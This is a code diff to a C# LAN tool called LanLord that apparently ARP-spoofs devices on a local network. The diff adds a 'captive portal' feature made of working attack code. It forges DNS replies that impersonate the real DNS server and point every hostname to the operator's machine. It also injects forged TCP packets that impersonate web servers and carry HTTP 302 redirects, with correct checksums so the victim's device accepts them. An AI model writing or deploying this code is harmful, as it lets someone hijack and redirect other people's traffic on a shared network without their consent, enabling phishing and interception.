@@ -68,6 +68,17 @@ namespace LanLord
 
         public Action<PC> OnPortScanDetected;
 
+        /// <summary>
+        /// Base URL of the local captive-portal HTTP server, e.g. "http://192.168.x.x:8088/".
+        /// Set by <see cref="ArpForm"/> when the server starts.  When non-null, inbound HTTP
+        /// requests from a device that has <see cref="PC.captivePortalEnabled"/> set to true
+        /// are answered with an HTTP 302 redirect to this URL instead of being forwarded.
+        /// </summary>
+        public string captivePortalUrl = null;
+
+        /// <summary>Fires on the redirector thread when a device's HTTP request is intercepted.</summary>
+        public Action<PC, string> OnCaptivePortalHit;
+
         // portScanStates[srcIP][dstIP] -> PortScanState; only accessed on redirector thread, no lock needed
         private Dictionary<string, Dictionary<string, PortScanState>> portScanStates =
             new Dictionary<string, Dictionary<string, PortScanState>>();
@@ -191,6 +202,7 @@ namespace LanLord
                     PC pCFromMac = pcList.getPCFromMac(array);
                     if (pCFromMac != null)
                     {
+                        bool captiveIntercepted = false;
                         // DNS sniffer: intercept queries from any spoofed device before forwarding decision
                         string dnsHost = parseDnsQuery(pkt_data);
                         if (dnsHost != null)
@@ -198,6 +210,20 @@ namespace LanLord
                             pCFromMac.lastDnsQuery = dnsHost;
                             Action<PC, string> dnsCallback = OnDnsQuery;
                             if (dnsCallback != null) dnsCallback(pCFromMac, dnsHost);
+                            // Captive portal DNS hijack: forge a DNS response pointing to our IP
+                            // so the device connects to our HTTP server instead of the real server.
+                            // Handles iOS/Android which use HTTPS exclusively but still send DNS over UDP.
+                            if (pCFromMac.captivePortalEnabled && captivePortalUrl != null && pCFromMac.redirect)
+                            {
+                                byte[] dnsReply = buildDnsResponse(pkt_data);
+                                if (dnsReply != null)
+                                {
+                                    pcapredirect.pcapnet_sendpacket(dnsReply);
+                                    captiveIntercepted = true;
+                                    Action<PC, string> cpCb = OnCaptivePortalHit;
+                                    if (cpCb != null) cpCb(pCFromMac, dnsHost);
+                                }
+                            }
                         }
                         // HTTP Host sniffer: cleartext HTTP on port 80
                         string httpHost = parseHttpHost(pkt_data);
@@ -251,8 +277,25 @@ namespace LanLord
                                 if (scanCallback != null) scanCallback(pCFromMac);
                             }
                         }
+                        // Captive portal TCP injection: fallback for direct-IP HTTP requests
+                        // that bypass DNS (e.g. pre-resolved addresses or apps that use IPs directly).
+                        if (!captiveIntercepted && pCFromMac.captivePortalEnabled && captivePortalUrl != null && pCFromMac.redirect)
+                        {
+                            string cpHost = parseHttpHost(pkt_data);
+                            if (cpHost != null)
+                            {
+                                byte[] cpReply = buildCaptivePortalTcpReply(pkt_data);
+                                if (cpReply != null)
+                                {
+                                    pcapredirect.pcapnet_sendpacket(cpReply);
+                                    captiveIntercepted = true;
+                                    Action<PC, string> cpCb = OnCaptivePortalHit;
+                                    if (cpCb != null) cpCb(pCFromMac, cpHost);
+                                }
+                            }
+                        }
                         int capUp = pCFromMac.capUp;
-                        if ((capUp == 0 || capUp > pCFromMac.nbPacketSentSinceLastReset) && pCFromMac.redirect)
+                        if (!captiveIntercepted && (capUp == 0 || capUp > pCFromMac.nbPacketSentSinceLastReset) && pCFromMac.redirect)
                         {
                             Array.Copy(routerMAC, 0, pkt_data, 0, 6);
                             Array.Copy(localMAC, 0, pkt_data, 6, 6);
@@ -650,6 +693,249 @@ namespace LanLord
             }
             string result = sb.ToString();
             return result.Length > 0 ? result : null;
+        }
+
+        /// <summary>
+        /// Builds a raw Ethernet+IPv4+TCP packet that contains an HTTP 302 response
+        /// redirecting the device to <see cref="captivePortalUrl"/>.  The response
+        /// correctly spoofs the original server's IP as the source so the device's
+        /// TCP stack accepts it, and uses proper IP and TCP checksums.
+        /// Returns null when <paramref name="pkt"/> is not a valid HTTP request.
+        /// </summary>
+        private byte[] buildCaptivePortalTcpReply(byte[] pkt)
+        {
+            // Minimum valid size: Eth(14) + IP(20 min) + TCP(20 min) = 54
+            if (pkt == null || pkt.Length < 54) return null;
+            if (pkt[12] != 0x08 || pkt[13] != 0x00) return null; // must be IPv4
+            if (pkt[23] != 6) return null;                        // must be TCP
+            int ihl    = (pkt[14] & 0x0F) * 4;
+            int tcpOff = 14 + ihl;
+            if (pkt.Length < tcpOff + 20) return null;
+            int dstPort = (pkt[tcpOff + 2] << 8) | pkt[tcpOff + 3];
+            if (dstPort != 80) return null;                       // only intercept HTTP
+
+            // --- Extract request fields ---
+            byte[] devMac  = new byte[6]; Array.Copy(pkt,  6, devMac, 0, 6); // Eth src = device MAC
+            byte[] devIp   = new byte[4]; Array.Copy(pkt, 26, devIp,  0, 4); // IP  src = device IP
+            byte[] srvIp   = new byte[4]; Array.Copy(pkt, 30, srvIp,  0, 4); // IP  dst = server IP (we forge as src)
+            int devPort    = (pkt[tcpOff]     << 8) | pkt[tcpOff + 1];       // TCP src port (device ephemeral)
+            uint reqSeq    = ((uint)pkt[tcpOff + 4] << 24) | ((uint)pkt[tcpOff + 5] << 16)
+                           | ((uint)pkt[tcpOff + 6] <<  8) |  (uint)pkt[tcpOff + 7];
+            uint reqAck    = ((uint)pkt[tcpOff + 8] << 24) | ((uint)pkt[tcpOff + 9] << 16)
+                           | ((uint)pkt[tcpOff + 10] << 8) |  (uint)pkt[tcpOff + 11];
+            // TCP payload length (needed to compute correct ACK in our response)
+            int ipTotalLen  = (pkt[16] << 8) | pkt[17];
+            int tcpHdrBytes = ((pkt[tcpOff + 12] >> 4) & 0x0F) * 4;
+            int tcpPayLen   = ipTotalLen - ihl - tcpHdrBytes;
+            if (tcpPayLen < 0) tcpPayLen = 0;
+
+            // --- Build HTTP 302 redirect response ---
+            byte[] body = System.Text.Encoding.ASCII.GetBytes(
+                "HTTP/1.1 302 Found\r\n" +
+                "Location: " + captivePortalUrl + "\r\n" +
+                "Content-Length: 0\r\n" +
+                "Connection: close\r\n\r\n");
+
+            int replyLen = 14 + 20 + 20 + body.Length;
+            byte[] reply = new byte[replyLen];
+
+            // Ethernet header: dst=device, src=localMAC (device's ARP cache points gateway → our MAC)
+            Array.Copy(devMac,   0, reply,  0, 6);
+            Array.Copy(localMAC, 0, reply,  6, 6);
+            reply[12] = 0x08; reply[13] = 0x00;
+
+            // IPv4 header (20 bytes, no options)
+            int ip    = 14;
+            int ipLen = 20 + 20 + body.Length;
+            reply[ip]     = 0x45;                       // version=4, IHL=5
+            reply[ip + 1] = 0x00;                       // DSCP/ECN
+            reply[ip + 2] = (byte)(ipLen >> 8);
+            reply[ip + 3] = (byte)(ipLen & 0xFF);
+            reply[ip + 4] = 0x00; reply[ip + 5] = 0x01; // identification
+            reply[ip + 6] = 0x40; reply[ip + 7] = 0x00; // flags: DF; fragment offset: 0
+            reply[ip + 8] = 0x40;                       // TTL = 64
+            reply[ip + 9] = 0x06;                       // protocol = TCP
+            // checksum placeholder — computed below
+            Array.Copy(srvIp, 0, reply, ip + 12, 4);   // src IP = original server IP (forged)
+            Array.Copy(devIp, 0, reply, ip + 16, 4);   // dst IP = device IP
+            uint ipCs = captiveChecksumOnesComplement(reply, ip, 20);
+            reply[ip + 10] = (byte)(ipCs >> 8);
+            reply[ip + 11] = (byte)(ipCs & 0xFF);
+
+            // TCP header (20 bytes)
+            int tcp = ip + 20;
+            reply[tcp]     = 0x00; reply[tcp + 1] = 0x50; // src port = 80
+            reply[tcp + 2] = (byte)(devPort >> 8);
+            reply[tcp + 3] = (byte)(devPort & 0xFF);       // dst port = device ephemeral port
+            // seq = reqAck  (server sends from what device last acknowledged)
+            reply[tcp + 4] = (byte)(reqAck >> 24); reply[tcp + 5] = (byte)(reqAck >> 16);
+            reply[tcp + 6] = (byte)(reqAck >>  8); reply[tcp + 7] = (byte)(reqAck & 0xFF);
+            // ack = reqSeq + tcpPayLen  (acknowledge the full request; if no payload treat as +1)
+            uint respAck = reqSeq + (uint)(tcpPayLen > 0 ? tcpPayLen : 1);
+            reply[tcp + 8]  = (byte)(respAck >> 24); reply[tcp + 9]  = (byte)(respAck >> 16);
+            reply[tcp + 10] = (byte)(respAck >>  8); reply[tcp + 11] = (byte)(respAck & 0xFF);
+            reply[tcp + 12] = 0x50;                       // data offset = 5 (20 bytes), reserved = 0
+            reply[tcp + 13] = 0x18;                       // flags: PSH + ACK
+            reply[tcp + 14] = 0xFF; reply[tcp + 15] = 0xFF; // window = 65535
+            // checksum placeholder — computed below; urgent pointer = 0
+            Array.Copy(body, 0, reply, tcp + 20, body.Length);
+            int tcpTotalLen = 20 + body.Length;
+            uint tcpCs = captiveTcpChecksumWithPseudo(srvIp, devIp, reply, tcp, tcpTotalLen);
+            reply[tcp + 16] = (byte)(tcpCs >> 8);
+            reply[tcp + 17] = (byte)(tcpCs & 0xFF);
+
+            return reply;
+        }
+
+        /// <summary>
+        /// Internet checksum (RFC 1071): ones-complement sum over <paramref name="len"/> bytes
+        /// starting at <paramref name="offset"/>.
+        /// </summary>
+        private static uint captiveChecksumOnesComplement(byte[] data, int offset, int len)
+        {
+            uint sum = 0;
+            int end = offset + len;
+            for (int i = offset; i < end - 1; i += 2)
+                sum += (uint)((data[i] << 8) | data[i + 1]);
+            if ((len & 1) != 0)
+                sum += (uint)(data[end - 1] << 8);
+            while ((sum >> 16) != 0)
+                sum = (sum & 0xFFFF) + (sum >> 16);
+            return (~sum) & 0xFFFF;
+        }
+
+        /// <summary>
+        /// TCP checksum: prepends the IPv4 pseudo-header (src, dst, 0, proto=6, tcp_len)
+        /// to the TCP segment and calls <see cref="captiveChecksumOnesComplement"/>.
+        /// </summary>
+        private static uint captiveTcpChecksumWithPseudo(byte[] srcIp, byte[] dstIp, byte[] data, int tcpOffset, int tcpLen)
+        {
+            byte[] buf = new byte[12 + tcpLen];
+            Array.Copy(srcIp, 0, buf, 0, 4);
+            Array.Copy(dstIp, 0, buf, 4, 4);
+            buf[8]  = 0x00;
+            buf[9]  = 0x06; // TCP
+            buf[10] = (byte)(tcpLen >> 8);
+            buf[11] = (byte)(tcpLen & 0xFF);
+            Array.Copy(data, tcpOffset, buf, 12, tcpLen);
+            return captiveChecksumOnesComplement(buf, 0, buf.Length);
+        }
+
+        /// <summary>
+        /// Forges a DNS A-record response for the incoming DNS query, resolving every
+        /// queried hostname to <see cref="localIP"/> so the device connects to the
+        /// local captive-portal HTTP server instead of the real server.
+        /// The source IP of the reply is spoofed to match the original DNS server so
+        /// the device's resolver accepts it without question.
+        /// Returns null if <paramref name="pkt"/> is not a valid IPv4/UDP DNS query.
+        /// </summary>
+        private byte[] buildDnsResponse(byte[] pkt)
+        {
+            if (pkt == null || pkt.Length < 55) return null;
+            if (pkt[12] != 0x08 || pkt[13] != 0x00) return null;  // IPv4
+            if (pkt[23] != 17) return null;                        // UDP
+            int ihl    = (pkt[14] & 0x0F) * 4;
+            int udpOff = 14 + ihl;
+            if (pkt.Length < udpOff + 8 + 12) return null;
+            int dstPort = (pkt[udpOff + 2] << 8) | pkt[udpOff + 3];
+            if (dstPort != 53) return null;                        // DNS only
+            int dnsOff = udpOff + 8;
+            if ((pkt[dnsOff + 2] & 0x80) != 0) return null;       // already a response
+
+            // Addressing from the original query packet
+            byte[] devMac    = new byte[6]; Array.Copy(pkt,  6, devMac,    0, 6);
+            byte[] devIp     = new byte[4]; Array.Copy(pkt, 26, devIp,     0, 4);
+            byte[] dnsServIp = new byte[4]; Array.Copy(pkt, 30, dnsServIp, 0, 4);
+            int devUdpPort   = (pkt[udpOff] << 8) | pkt[udpOff + 1];
+
+            // Walk the question section to measure its byte length
+            int qStart = dnsOff + 12;
+            int pos    = qStart;
+            int safety = 256;
+            while (pos < pkt.Length && safety-- > 0)
+            {
+                byte labelLen = pkt[pos];
+                if (labelLen == 0)             { pos++; break; }
+                if ((labelLen & 0xC0) == 0xC0) { pos += 2; break; } // compression pointer
+                pos += labelLen + 1;
+            }
+            if (pos + 4 > pkt.Length) return null;
+            pos += 4; // QTYPE(2) + QCLASS(2)
+            int questionLen = pos - qStart;
+
+            // Packet layout:
+            // Eth(14) + IP(20) + UDP(8) + DNS_hdr(12) + question + answer(16)
+            // Answer RR: name-ptr(2) + type(2) + class(2) + ttl(4) + rdlen(2) + A-rdata(4) = 16
+            int dnsPayloadLen = 12 + questionLen + 16;
+            int udpLen        = 8 + dnsPayloadLen;
+            int ipTotal       = 20 + udpLen;
+            byte[] reply      = new byte[14 + ipTotal];
+
+            // Ethernet header
+            Array.Copy(devMac,   0, reply,  0, 6);  // dst = device
+            Array.Copy(localMAC, 0, reply,  6, 6);  // src = our MAC
+            reply[12] = 0x08; reply[13] = 0x00;
+
+            // IPv4 header (20 bytes, no options)
+            int ip = 14;
+            reply[ip]     = 0x45;
+            reply[ip + 2] = (byte)(ipTotal >> 8);
+            reply[ip + 3] = (byte)(ipTotal & 0xFF);
+            reply[ip + 5] = 0x01;                   // identification
+            reply[ip + 6] = 0x40;                   // DF
+            reply[ip + 8] = 0x40;                   // TTL = 64
+            reply[ip + 9] = 0x11;                   // UDP
+            Array.Copy(dnsServIp, 0, reply, ip + 12, 4); // src = DNS server (spoofed)
+            Array.Copy(devIp,     0, reply, ip + 16, 4); // dst = device
+            uint ipCs = captiveChecksumOnesComplement(reply, ip, 20);
+            reply[ip + 10] = (byte)(ipCs >> 8);
+            reply[ip + 11] = (byte)(ipCs & 0xFF);
+
+            // UDP header
+            int udp = ip + 20;
+            reply[udp]     = 0x00; reply[udp + 1] = 0x35;        // src port = 53
+            reply[udp + 2] = (byte)(devUdpPort >> 8);
+            reply[udp + 3] = (byte)(devUdpPort & 0xFF);           // dst port = device ephemeral
+            reply[udp + 4] = (byte)(udpLen >> 8);
+            reply[udp + 5] = (byte)(udpLen & 0xFF);
+            // checksum filled after DNS payload is written
+
+            // DNS payload
+            int d = udp + 8;
+            reply[d]     = pkt[dnsOff];             // transaction ID high
+            reply[d + 1] = pkt[dnsOff + 1];         // transaction ID low
+            // Flags: QR=1, AA=0, TC=0, RD copy, RA=1
+            reply[d + 2] = (byte)((pkt[dnsOff + 2] | 0x80) & ~0x02);
+            reply[d + 3] = 0x80;                    // RA=1, RCODE=0
+            reply[d + 4] = pkt[dnsOff + 4];         // QDCOUNT high
+            reply[d + 5] = pkt[dnsOff + 5];         // QDCOUNT low
+            reply[d + 6] = 0x00; reply[d + 7] = 0x01; // ANCOUNT = 1
+            // NSCOUNT and ARCOUNT already 0
+            // Copy the question section verbatim
+            Array.Copy(pkt, qStart, reply, d + 12, questionLen);
+
+            // Answer RR: compressed name pointer back to the question name
+            int ans = d + 12 + questionLen;
+            reply[ans]      = 0xC0; reply[ans + 1] = 0x0C; // pointer to QNAME (DNS offset 12)
+            reply[ans + 2]  = 0x00; reply[ans + 3] = 0x01; // type A
+            reply[ans + 4]  = 0x00; reply[ans + 5] = 0x01; // class IN
+            // TTL fields [6..9] = 0 (no caching — device re-queries every time)
+            reply[ans + 10] = 0x00; reply[ans + 11] = 0x04; // rdlength = 4
+            Array.Copy(localIP, 0, reply, ans + 12, 4);     // A record = our LAN IP
+
+            // UDP checksum via pseudo-header (required; iOS verifies it)
+            byte[] pseudo = new byte[12 + udpLen];
+            Array.Copy(dnsServIp, 0, pseudo, 0, 4);
+            Array.Copy(devIp,     0, pseudo, 4, 4);
+            pseudo[9]  = 0x11;                    // protocol = UDP
+            pseudo[10] = (byte)(udpLen >> 8);
+            pseudo[11] = (byte)(udpLen & 0xFF);
+            Array.Copy(reply, udp, pseudo, 12, udpLen);
+            uint udpCs = captiveChecksumOnesComplement(pseudo, 0, pseudo.Length);
+            reply[udp + 6] = (byte)(udpCs >> 8);
+            reply[udp + 7] = (byte)(udpCs & 0xFF);
+
+            return reply;
         }
 
         public byte[] buildArpPacket(byte[] destMac, byte[] srcMac, short arpType, byte[] arpSrcMac, byte[] arpSrcIp, byte[] arpDestMac, byte[] arpDestIP)
